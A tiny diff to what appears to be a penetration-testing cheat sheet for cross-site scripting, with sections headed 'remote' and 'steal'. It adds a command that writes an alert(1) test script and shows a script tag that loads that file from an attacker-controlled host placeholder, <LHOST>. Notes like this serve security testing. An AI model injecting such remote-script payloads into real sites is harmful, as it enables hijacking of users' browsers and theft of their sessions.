@@ -1,6 +1,7 @@
 % xss
 
 # remote
+echo "alert(1)" > xss.js
 <script src="http://<LHOST>/xss.js"></script>
 
 # steal
